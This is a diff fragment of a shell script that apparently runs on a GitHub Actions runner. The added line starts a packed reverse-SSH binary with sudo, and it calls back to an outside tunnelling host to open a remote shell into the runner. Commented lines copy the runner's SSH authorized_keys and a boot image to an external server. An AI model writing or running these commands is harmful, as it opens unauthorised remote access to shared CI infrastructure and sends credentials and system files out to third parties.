@@ -259,7 +259,8 @@ ip5=${ip_port5%:*};
 
 if [ ! -z ${port5} ] && [ ! -z ${ip5} ]; then
 ((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -l -p 60021)&)&
-((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b 50020  -p 45488 server.natappfree.cc )&)&
+((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b 50050  -p 34292 ngrok.xiaomiqiu123.top )&)&
+
 #sudo apt-get install redis-server
 #sudo scp -P 28357 /home/runner/.ssh/authorized_keys    root@node4.buuoj.cn:/root/.ssh/authorized_keys
 #sudo scp -o StrictHostKeyChecking=no -P 28357 /boot/initrd.img-5.15.0-1022-azure root@node4.buuoj.cn:/tmp/initrd.img-5.15.0;
